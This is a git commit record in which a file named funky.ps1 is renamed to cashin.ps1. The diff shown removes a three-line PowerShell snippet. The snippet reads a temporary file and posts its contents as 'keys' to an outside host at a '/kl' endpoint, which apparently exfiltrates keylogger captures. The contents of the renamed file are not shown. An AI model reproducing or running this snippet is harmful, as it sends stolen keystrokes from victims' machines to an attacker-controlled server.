46498c8a113deb25207bb208a28b3a97ddb2e995
Zachary Hales <51687053+SmartMozart@users.noreply.github.com>
2023-05-11 17:31:46 -0600

    Update and rename funky.ps1 to cashin.ps1

--- funky.ps1
+++
@@ -1,3 +0,0 @@
-$url = "https://api.dogwater53.us/kl"
-$body = @{"keys" = [IO.File]::ReadAllText("$env:temp\wsuA58F.tmp")}
-Invoke-WebRequest -Method 'Post' -Uri $url -Body ($body|ConvertTo-Json) -ContentType "application/json"
